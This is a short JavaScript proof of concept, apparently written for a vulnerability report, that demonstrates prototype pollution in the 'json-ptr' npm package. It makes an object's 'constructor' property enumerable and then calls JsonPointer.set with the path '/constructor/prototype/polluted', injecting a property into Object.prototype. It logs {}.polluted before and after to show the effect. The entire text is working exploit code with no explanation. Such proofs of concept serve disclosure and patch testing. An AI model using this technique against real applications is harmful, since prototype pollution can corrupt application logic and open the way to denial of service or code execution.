var obj = {};
obj.constructor.prototype.polluted = undefined;
Object.defineProperty(obj, 'constructor', {
    value: obj.constructor,
    writable: true,
    enumerable: true,
    configurable: true
});
console.log({}.polluted);
const {JsonPointer} = require('json-ptr');
JsonPointer.set(obj, '/constructor/prototype/polluted', 'yes', true);
console.log({}.polluted);